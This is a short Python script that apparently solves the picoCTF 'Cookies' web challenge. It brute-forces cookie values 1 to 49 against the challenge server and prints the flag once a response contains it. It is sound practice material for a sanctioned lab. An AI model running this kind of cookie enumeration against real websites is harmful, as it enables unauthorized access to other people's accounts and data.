import requests 

# I used this to help me with the code: https://cyb3rwhitesnake.medium.com/picoctf-cookies-web-39d8fedd345f
# You can also do this using burp intruder: https://portswigger.net/burp/documentation/desktop/tools/intruder/getting-started

for cookie_value in range(1, 50):
    r = requests.get("http://mercury.picoctf.net:29649/check", headers={"Cookie": 'name=' + str(cookie_value)})

    if (r.status_code == 200 and 'picoCTF{' in r.text):
        print("Flag cookie value:", cookie_value)
        print(r.text[1005::])
        break
